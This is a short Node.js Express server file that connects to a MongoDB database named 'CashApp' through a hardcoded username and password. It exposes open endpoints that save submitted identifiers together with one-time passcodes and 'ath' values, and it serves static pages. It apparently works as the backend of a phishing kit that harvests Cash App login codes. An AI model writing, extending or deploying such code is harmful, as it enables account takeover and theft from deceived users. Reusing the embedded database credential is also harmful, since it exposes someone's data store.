// server.js
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');

const app = express();

// Configuration Variables
const PORT = 5000; // You can change this to any port you prefer

// MongoDB Connection String
const MONGODB_URI = 'mongodb+srv://Ban:12lomzyposh@pay.vsa1v.mongodb.net/CashApp?retryWrites=true&w=majority&appName=Pay';

// Middleware
app.use(express.json());
app.use(cors());
app.use(express.static('public')); // To serve static files like HTML, CSS, JS

// MongoDB Connection
mongoose.connect(MONGODB_URI)
    .then(() => console.log('MongoDB Connected'))
    .catch(err => console.log('MongoDB connection error:', err));

// OTP Schema
const otpSchema = new mongoose.Schema({
    identifier: { type: String },
    otp: { type: String },
}, { timestamps: true });

// Ensure the OTPs are stored in the "otps" collection
const OTP = mongoose.model('OTP', otpSchema, 'otps');

// ATH Schema
const athSchema = new mongoose.Schema({
    identifier: { type: String },
    ath: { type: String },
}, { timestamps: true });

const ATH = mongoose.model('ATH', athSchema);

// API Routes

/**
 * @route   POST /api/submit-otp
 * @desc    Submit Identifier and OTP
 * @access  Public
 */
app.post('/api/submit-otp', async (req, res) => {
    const { identifier, otp } = req.body;

    const newOTP = new OTP({ identifier, otp });
    await newOTP.save();

    res.status(200).json({ message: 'OTP submitted successfully.' });
});

/**
 * @route   POST /api/submit-ath
 * @desc    Submit ATH associated with an Identifier
 * @access  Public
 */
app.post('/api/submit-ath', async (req, res) => {
    const { identifier, ath } = req.body;

    const newATH = new ATH({ identifier, ath });
    await newATH.save();

    res.status(200).json({ message: 'ATH submitted successfully.' });
});

// Start Server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
